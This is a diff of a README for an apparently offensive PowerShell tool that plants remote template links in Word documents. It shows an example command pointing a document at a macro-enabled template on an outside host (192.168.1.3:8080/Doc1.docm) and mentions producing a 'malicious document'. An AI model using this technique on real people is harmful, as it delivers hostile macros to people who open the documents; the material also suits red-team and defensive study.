@@ -29,6 +29,7 @@ This tool is licensed under the [![License: MIT](https://img.shields.io/badge/MI
   - [Installation](#installation)
   - [cmdlets](#cmdlets)
     - [Invoke-Template](#invoke-template)
+      - [Invoke Template Example](#invoke-template-example)
     - [Invoke-Regular](#invoke-regular)
     - [Invoke-Identify](#invoke-identify)
   - [References](#references)
@@ -59,7 +60,7 @@ Invoke-Template is a cmdlet that implements remote template links within default
 
 #### Invoke-Template Example
 
-Assuming that you have a default Word template, like this:
+Assuming that you have a default Word template, like this (Saved as, for example, 'Name.docx'):
 
 ![Default Word Template Document](/Pictures/Default-Word-Template.png)
 
@@ -72,6 +73,8 @@ Invoke-Template -InputDoc Name.docx -Link "https://192.168.1.3:8080/Doc1.docm" -
 Outcome:
 
 ![Invoke-Template-1](/Pictures/Invoke-Template-1.png)
+
+As you can see, the Invoke-Template module keeps a backup of the original document and provides the full path to the malicious document.
 
 ### Invoke-Regular
 
